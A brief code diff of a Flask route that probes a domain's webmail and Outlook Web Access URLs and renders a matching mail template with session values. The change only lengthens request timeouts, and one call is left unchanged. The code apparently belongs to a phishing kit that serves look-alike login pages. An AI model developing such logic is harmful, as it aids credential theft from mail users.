@@ -188,9 +188,9 @@ def route2():
             owa_url2 = f"https://autodiscover.{domain}/owa/#path=/mail/search"
             
             try:
-                if requests.get(webmail_url, timeout=3).status_code == 200:
+                if requests.get(webmail_url, timeout=13).status_code == 200:
                     return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-                if requests.get(owa_url1, timeout=3).status_code == 200 or requests.get(owa_url2, timeout=3).status_code == 200:
+                if requests.get(owa_url1, timeout=13).status_code == 200 or requests.get(owa_url2, timeout=3).status_code == 200:
                     return render_template('owa.html', eman=session['eman'], ins=session['ins'])
             except requests.RequestException:
                 pass
